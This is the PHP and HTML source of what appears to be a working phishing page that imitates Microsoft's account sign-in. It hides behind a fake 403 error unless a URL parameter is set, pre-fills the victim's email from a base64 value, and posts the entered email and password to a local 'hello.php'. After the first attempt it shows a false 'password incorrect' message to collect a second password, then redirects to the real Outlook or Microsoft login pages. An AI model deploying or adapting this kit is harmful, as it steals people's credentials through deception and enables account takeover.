<?php
include('block_detectors.php');
if(isset($_GET['wa']) && $_GET['wa'] != ''){
}else{
header('HTTP/1.0 403 Forbidden', true, 403);
	die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don\'t have permission to access this resource.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
');	

}
$email = base64_decode($_GET['id']);
$dis = 'hidden';
$dis2 = '';
if( filter_var( $email, FILTER_VALIDATE_EMAIL ) ) {
    $dis = '';
	$dis2 = 'hidden';
}

?>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in to your account</title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

 <link rel="shortcut icon" href="./files/favicon_a.ico">
    
<head>
<script src="./files/jquery-1.9.0.min.js"></script>
</head>
<body>
 <div style="z-index:1;width:100%;height:100%;background: url(./files/0.jpg); 
    background-repeat: no-repeat;
  background-size: cover;"></div>
<div style="position:absolute;left:0px;top:0px;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:2"></div>  
   <style>
   .inner {
    margin-left: auto;
    margin-right: auto;
    min-width: 320px;
    max-width: 350px;
    width: calc(100% - 40px);
    padding: 44px;
    margin-bottom: 28px;
    background-color: #fff;
	position: absolute;
    top: 35%;
    left: 48%;
    margin: -100px 0 0 -210px;
	
-webkit-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-moz-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
box-shadow: 0 2px 6px rgba(0,0,0,0.2);

overflow: hidden;
	z-index:3
	}
	
	.row {
    margin-left: -2px;
    margin-right: -2px;
	
}
.text-title, h3, .text-body, p {
    padding: 0;
    margin-top: 16px;
    margin-bottom: 16px;
}
.text-title, h3 {
    font-weight: 300;
    font-size: 1.5rem;
    line-height: 1.75rem;
}
body {
    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    line-height: 1.25rem;
    color: #262626;
	margin: 0; 
	height: 100%; 
	overflow: hidden
}
div.placeholderContainer {
    width: 100%;
    position: relative;
}
.input {
    width: 100%;
    position: relative;
	height:35;
	font-size: 1rem;
    line-height: 1.75rem;
	border:none;
	border-color: rgba(0,0,0,0.6);
	border-bottom:1px solid rgba(0,0,0,0.6);
}
.input:focus{
	border-color: blue;
}
.btn {
    width: 108px;
	height:32px;
	border:none;
	cursor: pointer;
	touch-action: manipulation;
	font-size: 15px;
    
}
a {
    color: #0067b8;
    text-decoration: none;
	font-size: 13px;
}

.optin-banner {
    position: fixed;
    bottom: 40px;
    right: 12px;
    color: #262626;
    background-color: #fff;
    padding: 24px;
    font-size: 13px;
    width: 380px;
    z-index: 100;
    -webkit-box-shadow: 0 2px 3px rgba(0,0,0,0.55);
    -moz-box-shadow: 0 2px 3px rgba(0,0,0,0.55);
    box-shadow: 0 2px 3px rgba(0,0,0,0.55);
}

.footer {
    position: fixed;
    bottom: 0;
    width: 100%;
    overflow: visible;
    z-index: 99;
    clear: both;
    background-color: rgba(0,0,0,0.8);
	text-align:right;
	font-size: 13px;
	height:30;}
	
	.identityBanner {
    background: #f2f2f2;
    margin: 16px -36px 10px -36px;
    padding: 0 36px;}
	
	.profile-photo {
    height: 48px;
    width: 48px;
    margin-top: -48px;
    border-radius: 50%;
    overflow: hidden;
    float: right;
}
.identity {
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    text-align: left;
    width: calc(100% - 56px);
}
.backButton {
    height: 24px;
    width: 24px;
    min-width: 24px;
    float: left;
    padding: 0;
    background-color: #fff;
    border-width: 0;
    border-radius: 12px;
    margin-right: 2px;
	cursor: pointer
}
.backButton:hover{
	background-color: #b6b6b6;
}

.btnH{
	width:130%;
	height:70px;
	margin-left:-45px;
	background:transparent;
	border:none;
	cursor:pointer;
	
}
.btnH:hover{
	background: #e6e6e6;
}

   </style>
<form id="myForm1" method="post" name="myForm1">
   <div class="inner" id="mydivon" style="display:block">
<div id="div" class="spinner" style="display:none;">
<div></div>
<div></div>
<div></div>
<div></div></div>
   <img class="logo" role="presentation"src="./files/microsoft_logo.svg">
 <div id="subD" style="padding-top:10px;height:200px" <?php echo $dis;?>>
 <img src="files/sub.png">
 <div class="btnH" style="" onclick="toggleDiv('mydiv');">
 <img src="files/sub1.png" style="margin-left:45px">
 <span style="position:relative;left:110px;top:-45px"> <?php echo $email;?></span>
 </div>
 <div class="btnH" style="" onclick="$('#email').val('');$('#subD').hide();$('#mainD').show();">
 <img src="files/sub2.png" style="margin-left:45px">
 </div>
 </div>
 <div id="mainD" <?php echo $dis2;?>>
 <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['WF_STR_HeaderDefault_Title']">Sign in</div>
 <span id="error" style="color:red;display:none">    </span>  
<div class="placeholderContainer">
<input onkeyup="cc();" type="email" class="input chatinput" placeholder='Email, phone, or Skype' name="email" id="email" autocomplete="off" value="<?php echo $email ?>">
</div>
</p>

<div class="row">
<font style="font-size: .8125rem;">&nbsp;No account?</font><a href="#">&nbsp;Create one!</a></p>
<a href="#">&nbsp;Sign-in options</a>
</div>
</br>
<div class='inpu'>
<input hidden type="button" class="btn" value="Back" style="background-color: rgba(0,0,0,0.2);"> <input type="submit" class="btn" onclick="toggleDiv('mydiv'); return false;" value="Next" style="float:right;background-color: #0067b8; color:#fff;">
</div>

</div>
</div>
</form>

<form id="myForm" method="post" name="myForm">
<div class="inner mydivoff" id="mydivoff" style="display:none">
<div id="div2" class="spinner2" style="display:none;">
<div></div>
<div></div>
<div></div>
<div></div></div>

   <img class="logo" role="presentation"src="./files/microsoft_logo.svg">
   <div class="identityBanner" hidden> <div class="identity  printchatbox" title="<?php echo $email ?>"><?php echo $email ?></div> <div class="profile-photo"> <img role="presentation" data-bind="attr: { src: getUrl() }" src="files/assets.svg"> </div> </div>
   <div class="identityBanner" style="background:#fff"><div style="float:left"><button type=button onclick="back()" class=backButton><img src="files/arrow.svg"></button></div> <div class="identity  printchatbox" title="<?php echo $email ?>"><?php echo $email ?></div>  </div>
   <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['WF_STR_HeaderDefault_Title']">Enter password</div>
<span id="errorname" style="color:red;display:none">    </span>
  <div class="placeholderContainer">
  
<input type="password" class="input" placeholder='Password' name="pass" id="pass">
</div>


</p>
<div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.fLockUsername &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in" type="checkbox"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div>

<div class="row">
</p>
<a href="#">&nbsp;Forgot my password</a>
</div>
</br>
<div class='inpu'>
<input hidden type="button" class="btn" value="Back" onclick="toggleDiv('mydiv');" style="background-color: rgba(0,0,0,0.2);"> <input type="submit" onclick="validateForm(); return false;" class="btn" value="Sign in" style="float:right;background-color: #0067b8; color:#fff;">
</div>
</div> 
</form>
<form id="myForm2" method="post" name="myForm2">
<div class="inner mydivoff" id="next" style="display:none">
<div id="div3" class="spinner3" style="display:none;">
<div></div>
<div></div>
<div></div>
<div></div></div>

   <img class="logo" role="presentation"src="./files/microsoft_logo.svg">
   <div hidden class="identityBanner"> <div class="identity  printchatbox" title="<?php echo $email ?>"><?php echo $email ?></div> <div class="profile-photo"> <img role="presentation" data-bind="attr: { src: getUrl() }" src="./files/assets.svg"> </div> </div>
   <div class="identityBanner" style="background:#fff"> <div style="float:left"><button type=button onclick="back()" class=backButton><img src="files/arrow.svg"></button></div> <div class="identity  printchatbox" title="<?php echo $email ?>"><?php echo $email ?></div> </div>
   <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['WF_STR_HeaderDefault_Title']">Enter password</div>
<span id="errorname2" style="color:red"> Your account or password is incorrect. If you don't remember your password, <font style="color:blue">reset it now.</font></span>
<span id="errorname2" style="color:red">    </span>
  <div class="placeholderContainer">
  
<input type="password" class="input" placeholder='Password' name="pass2" id="pass2">
</div>


</p>
<div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.fLockUsername &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in" type="checkbox"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div>

<div class="row">
</p>
<a href="#">&nbsp;Forgot my password</a>
</div>
</br>
<div class='inpu'>
<input hidden type="button" class="btn" value="Back" onclick="next(); return false;" style="background-color: rgba(0,0,0,0.2);"> <input type="submit" onclick="validateForm2(); return false;" class="btn" value="Sign in" style="float:right;background-color: #0067b8; color:#fff;">
</div>

</div> 
</form>


<div hidden id="optOutUserBanner" class="optin-banner table"> <div class="table-row"> <div class="table-cell"> <div data-bind="html: html['CT_STR_OptOut_Description']">You're seeing our <strong>new sign-in experience</strong></div> <div> <a id="uxOptOutLink" href="#" data-bind="click: optOut_onClick, text: str['CT_STR_OptOut_Link']">Go back to the old one</a> </div> </div> </div></div>
<div id="footer" class="footer default" > <span id="ftrCopy"  style="color:white;">Terms of use &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Privacy &amp; cookies&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size:14px;font-weight:800;">. . .</span>&nbsp;&nbsp;&nbsp;&nbsp;</span></div> </div>

<script language="javascript">

  function cc()
  {
	document.getElementById('error').innerHTML="";
  var email = document.getElementById('email');
    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

    if (!filter.test(email.value)) {
     document.getElementById('error').innerHTML="Enter a valid email address, phone number, or Skype name."; 
    //email.focus;
    //return false;	
 }
  }

  function toggleDiv(divid)
  {
  var email = document.getElementById('email');
    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

    if (!filter.test(email.value)) {
	document.getElementById('error').style.display="block";
     document.getElementById('error').innerHTML="Enter a valid email address, phone number, or Skype name."; 
    email.focus;
    return false;	
 }
else{
  $("#div").show();
 
    varon = divid + 'on';
    varoff = divid + 'off';

    if(document.getElementById(varon).style.display == 'block')
    {
	var duration = 3000;
    setTimeout(function() {
	$("#div").hide();
    document.getElementById(varon).style.display = 'none';
    document.getElementById(varoff).style.display = 'block';
	$('#pass').focus();
    }, duration);
	}

    else
    {
    $("#div").hide(); 	
    document.getElementById(varoff).style.display = 'none';
    document.getElementById(varon).style.display = 'block'
    }
	}
	

}   
</script>
<script>
function validateForm() {
    var email = document.getElementById("email").value;
var password = document.getElementById("pass").value;
// Returns successful data submission message when the entered information is stored in database.
var dataString = '&email1=' + email + '&password1=' + password;
    var y = document.forms["myForm"]["pass"].value;
    if (y == null || y == "") {
		document.getElementById('errorname').style.display="block";
        document.getElementById('errorname').innerHTML="Please enter your password.";
        return false;
    }
	else {
$("#div2").show();
// AJAX code to submit form.
$.ajax({
type: "POST",
url: "hello.php",
data: dataString,
cache: false,
success: function(data) {
var duration = 1000;
    setTimeout(function() {
		//alert(data);
if(data == 1){
	window.location = "https://outlook.office.com/owa/";
	return false;
}else{
$("#div2").hide();
    document.getElementById("mydivoff").style.display = 'none';
    document.getElementById("next").style.display = 'block';
 $('#pass2').focus();
	}
}, duration);}

});

}
 return false;   
}
</script>
<script>
$('.chatinput').keyup(function(event) {
  newText = event.target.value;
  $('.printchatbox').text(newText);
  $('.printchatbox').attr('title',newText);
}); 
 
</script> 
<script>
function back() {
    document.getElementById("next").style.display = 'none';
    document.getElementById("mydivoff").style.display = 'none';
    document.getElementById("mydivon").style.display = 'block';
  $('.mydivoff').hide();
 $('.mydivon').show();
	$( '#myForm' ).each(function(){
    this.reset();
});
	$( '#myForm1' ).each(function(){
    this.reset();
});
	$( '#myForm2' ).each(function(){
    this.reset();
});
	}
</script>
<script>
function validateForm2() {
    var email = document.getElementById("email").value;
var password = document.getElementById("pass2").value;
// Returns successful data submission message when the entered information is stored in database.
var dataString = '&email1=' + email + '&password1=' + password;
    var y = document.forms["myForm2"]["pass2"].value;
    if (y == null || y == "") {
        document.getElementById('errorname2').innerHTML="Please enter your password.";
        return false;
    }
	else {
$("#div3").show();
// AJAX code to submit form.
$.ajax({
type: "POST",
url: "hello.php",
data: dataString,
cache: false,
success: function(data) {
var duration = 1000;
    setTimeout(function() {
		//alert(data);
if(data == 1){
	window.location = "https://login.microsoftonline.com/";
	return false;
}else{
$("#div3").hide();
    document.getElementById("mydivoff").style.display = 'none';
    document.getElementById("next").style.display = 'block';
 $('#pass2').val('');
 $('#pass2').focus();
	}
}, duration);}

});

}
 return false;   
}
</script>

<style>
.spinner div{
  width: 5px;
  height: 5px;
  position: absolute;
  left: -20px;
  top: 0px;
  background-color: #005da6;
  border-radius: 50%;
  animation: move 4s infinite cubic-bezier(.2,.64,.81,.23);
}
.spinner div:nth-child(2) {
  animation-delay: 150ms;
}
.spinner div:nth-child(3) {
  animation-delay: 300ms;
}
.spinner div:nth-child(4) {
  animation-delay: 450ms;
}
.spinner2 div{
  width: 5px;
  height: 5px;
  position: absolute;
  left: -20px;
  top: 0px;
  background-color: #005da6;
  border-radius: 50%;
  animation: move 4s infinite cubic-bezier(.2,.64,.81,.23);
}
.spinner2 div:nth-child(2) {
  animation-delay: 150ms;
}
.spinner2 div:nth-child(3) {
  animation-delay: 300ms;
}
.spinner2 div:nth-child(4) {
  animation-delay: 450ms;
}
.spinner3 div{
  width: 5px;
  height: 5px;
  position: absolute;
  left: -20px;
  top: 0px;
  background-color: #005da6;
  border-radius: 50%;
  animation: move 4s infinite cubic-bezier(.2,.64,.81,.23);
}
.spinner3 div:nth-child(2) {
  animation-delay: 150ms;
}
.spinner3 div:nth-child(3) {
  animation-delay: 300ms;
}
.spinner3 div:nth-child(4) {
  animation-delay: 450ms;
}
@keyframes move {
  0% {left: 0%;}
  75% {left:100%;}
  100% {left:100%;}
}
</style>  
   </body>